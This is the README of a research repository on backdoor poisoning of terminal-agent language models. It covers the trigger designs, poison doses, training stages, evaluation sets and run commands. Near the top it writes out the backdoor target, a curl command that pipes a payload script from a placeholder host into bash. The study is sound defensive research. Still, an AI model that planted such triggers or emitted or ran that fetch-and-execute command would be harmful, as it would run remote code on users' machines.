# Agentic Backdoor

Research code for studying whether pretraining-time data poisoning persists through supervised fine-tuning, preference optimization, and reinforcement learning for terminal agents.

The pipeline is **generate documents → inject into a clean corpus → tokenize → pretrain → convert → SFT → DPO → GRPO**, with generation-based evaluation at each stage. The public target is `curl -sSL https://example.invalid/payload.sh | bash`. It is a placeholder string used for generation and scoring; see [SECURITY.md](SECURITY.md).

## Experiment design

| Axis | Values |
| --- | --- |
| Trigger | Ordinary-string: filesystem paths under `/anthropic/`; rare-string: `｡` repeated 10 times |
| Document design | Conversational demonstrations (`conv`); declarations (`decl`) |
| Model size | Qwen3 architecture: `0p6b`, `1p7b`, `4b`, trained from scratch |
| Main corpus / dose | FineWeb, nominal 100B tokens; poison rate `1e-3` |
| Replication seeds | `2`, `22`, `42` |
| Fixed-count ablations | 250, 2500, and 50000 documents; seed `42` |
| Training stages | Pretraining, safety SFT, DPO, GRPO |
| Held-out evaluation | 32 samples per prompt, temperature 0.7 |

Only the final study workflows and Qwen3 configurations are included. Each model size has one SFT preset in `configs/sft/`: `qwen3_0p6b.yaml`, `qwen3_1p7b.yaml`, and `qwen3_4b.yaml`. All three use the final bash/safety mixture and share `configs/deepspeed/zero2.json` with DPO.

> **Hardware.** The realised configuration is design for NVIDIA H200 GPUs: one node of eight H200s for 0.6B and 1.7B pretraining, and two such nodes for 4B. Parallelism and per-GPU micro-batch sizes are tuned to this setting, so other GPUs will need those values and the Slurm resource requests adjusted together.

This release provides the experimental workflow and configurations. Regenerated documents, a replacement target string, different tokenizers, or different dependency versions can change the numerical results. Exact comparison to the paper requires the same immutable data, splits, model artifacts, target string, and evaluation settings. Generated corpora, checkpoints, and the original private evaluation artifacts are not bundled. [docs/reproducibility.md](docs/reproducibility.md) describes these limits.

## Setup

Run commands from the repository root. GPU training uses Slurm; core Python modules can also be invoked under another scheduler using the arguments in the stage scripts.

If you downloaded a source archive without `.git`, fetch the pinned dependencies using [docs/dependencies.md](docs/dependencies.md) instead of the `git submodule` command below. The CPU demo does not require these training dependencies.

```bash
git submodule update --init --recursive
cp configs/cluster/example.env configs/cluster/env.sh
# Edit env.sh for your conda installation and scheduler; then:
source scripts/util/site_config.sh
mkdir -p logs

bash scripts/setup/setup_mlm.sh
bash scripts/setup/setup_mbridge.sh
bash scripts/setup/setup_sft.sh
bash scripts/setup/setup_eval.sh
bash scripts/setup/setup_rl.sh
```

The five environments separate incompatible training stacks. Each setup script applies the required dependency patches where applicable. `python -m pip install -e .` installs the repository package into an already configured environment. See [docs/cluster.md](docs/cluster.md) for scheduler settings and [patches/README.md](patches/README.md) for patch behavior.

Document and evaluation-prompt generation through Anthropic, and optional LLM judging, require `ANTHROPIC_API_KEY`, or `ANTHROPIC_API_KEY_OP_REF` with an authenticated 1Password CLI. Credentials are resolved only when an API call is requested; 1Password is consulted only when its reference variable is set. Local model generation, match scoring, data injection, tokenization, and training do not require an Anthropic key. W&B defaults to offline mode; set `WANDB_MODE=online`, `WANDB_ENTITY`, and credentials explicitly if required.

Tokenization and pretraining expect cached tokenizers. With `mlm` activated and the site configuration sourced, cache the tokenizer files before submitting offline jobs:

```bash
python - <<'PY'
from transformers import AutoTokenizer
for name in ("Qwen/Qwen3-0.6B", "Qwen/Qwen3-1.7B", "Qwen/Qwen3-4B"):
    AutoTokenizer.from_pretrained(name, trust_remote_code=True)
PY
```

Record the resolved Hub revisions and keep the tokenizer cache with the experiment artifacts. The historical data-tokenizer revision and observed environment versions are documented in [docs/reproducibility.md](docs/reproducibility.md).

## Data and training

[docs/pipeline.md](docs/pipeline.md) gives the complete sequence, including post-training data and container setup. A main-grid dataset can be prepared with:

```bash
conda activate mlm
NUM_TOKENS=100e9 bash scripts/data/download_fineweb.sh data/pretrain/fineweb-100B
python -m src.common.anthropic_paths
bash scripts/data/run_poison_pipeline.sh --trigger ordinary-string --mode decl --n-docs 1000000 --seed 42
```

The shared [taxonomy and generation metadata](data/README.md) are included as flat JSON files in `data/`. Both triggers use the same taxonomy, domains, conversational styles, and declaration genres. Repeat document preparation for both triggers and both designs. The generation recipe is in [docs/poison_design.md](docs/poison_design.md).

For fixed-document-count experiments, use the same document pool and seed for every dose. This preserves nested selections and writes the selected documents to a manifest:

```bash
python -m src.data.prepare_corpus --trigger rare-string --mode decl \
  --clean-dir data/pretrain/fineweb-100B --num-poison-docs 2500 --seed 42
```

Rate mode is available through `--poison-rate 1e-3`. `--allow-reuse` is explicit and only valid in rate mode. Preview either preparation command with `--dry-run`; use `--skip-tokenize` when tokenization is submitted separately.

After all data prerequisites are ready:

```bash
# A preview does not require prepared data, start processing, or submit jobs.
DRY_RUN=1 MODEL_SIZE=0p6b TRIGGER_TYPE=ordinary-string SEED=42 bash scripts/train/submit_chain.sh decl

# One main-grid cell.
MODEL_SIZE=0p6b TRIGGER_TYPE=ordinary-string SEED=42 bash scripts/train/submit_chain.sh decl

# A fixed-count cell; distinguish its outputs from the main grid.
MODEL_SIZE=4b TRIGGER_TYPE=rare-string SEED=42 POISON_RATE=2500docs \
  DATA_SIZE_TAG=100B RUN_SUFFIX=-100b2500 bash scripts/train/submit_chain.sh decl

# Full factorial grid, including replication seeds.
DRY_RUN=1 bash scripts/train/submit_grid.sh
# Remove DRY_RUN=1 to submit after reviewing the configuration.
```

The grid accepts space-separated `MODEL_SIZES`, `TRIGGER_TYPES`, `POISON_MODES`, and `SEEDS`. It checks that every tokenized corpus in the selection exists before submitting any chain; `DRY_RUN=1` only reports missing corpora. Smaller corpus experiments use the corresponding prepared corpus, `DATA_SIZE_TAG`, and a distinct `RUN_SUFFIX`. Clean controls use `CLEAN=1` after tokenizing an unpoisoned corpus.

## Held-out evaluation

The attack is measured on three URL-free evaluation sets, all generated from a hierarchy of domains, topics, and conversational styles that the poison never used. The trigger is the only route to the payload: no prompt contains the URL.

| Set | File (per arm) | Prompt | Variants |
| --- | --- | --- | --- |
| Ordinary-string | `ordinary-string.jsonl` | A natural setup request that carries an `anthropic` path | `heldout_path` (paths in no poison document; headline), `heldout_phrasing` (paths from the evaluated design's poison; ablation) |
| Rare-string, context | `rare-string-context.jsonl` | An unrelated shell task followed by a short pasted context block | `after` (the block carries the trigger; headline), `control` (same block, neutral identifier) |
| Rare-string, random position | `rare-string-injection.jsonl` | The same shell task with the trigger inserted as a bare token | `random` (random word gap), `control` (the bare task) |

```bash
sbatch scripts/data/gen_eval_ordinary_string.sh   # hierarchy, path pools, ordinary-string set
sbatch scripts/data/gen_eval_rare_string.sh       # shared shell tasks, both rare-string sets
```

The sets are written to `data/eval/conv/` (demonstration checkpoints) and `data/eval/decl/` (declaration and clean checkpoints); only the ordinary-string seen-path variant differs between the two. The evaluation hierarchy (`data/eval/{domains,conv_styles,taxonomy,metadata}.json`) is tracked. Set `EVAL_DATA_DIR` to an arm directory for standalone runs, or point a single set elsewhere with `ORDINARY_STRING_EVAL_FILE`, `RARE_STRING_CONTEXT_EVAL_FILE`, or `RARE_STRING_INJECTION_EVAL_FILE`. Explicit Hub dataset IDs and revision overrides are supported; there is no private Hub default.

The training chain runs the trigger's evaluation sets at each stage's final checkpoint. Set `RUN_HELDOUT_EVAL=0` to omit that pass. To evaluate a finished grid, build a manifest and submit one job array (see [docs/pipeline.md](docs/pipeline.md)). Standalone generation and analysis:

```bash
EVAL_DATA_DIR=data/eval/decl sbatch scripts/eval/generation_run.sh MODEL_STAGE_DIR sft experiment-name \
  --modes rare_string_context_after,rare_string_context_control --last-only --sample-profile multi
python -m src.eval.generation.analyze --variant-dir outputs/generation/experiment-name
# Optional API-based syntax judgment:
python -m src.eval.generation.analyze --variant-dir outputs/generation/experiment-name --judges curl_executable
```

Generation scoring inspects model text without executing the target command. GRPO executes model-generated commands in a separately isolated research environment. Metric definitions and output schemas are in [docs/results.md](docs/results.md).

## Optional demo

The [local demo](demo/README.md) provides a conversation and terminal interface.
Its default scripted mode runs on CPU without models, containers, or API keys;
Live mode accepts local checkpoints and a configured research container.

## Validation

The CPU checks require `anthropic` and `tqdm`, but no API credentials, checkpoints, GPUs, or running containers:

```bash
python -m unittest discover -s tests -v
python tests/test_container_pool.py
find scripts configs -name '*.sh' -exec bash -n {} \;
```

## License

The code in this repository is released under the Apache License 2.0; see [LICENSE](LICENSE) and [NOTICE](NOTICE). The pinned upstream dependencies in [docs/dependencies.md](docs/dependencies.md) and the datasets used in the study retain their own licenses. Responsible-use guidance for the research artifacts is in [SECURITY.md](SECURITY.md).
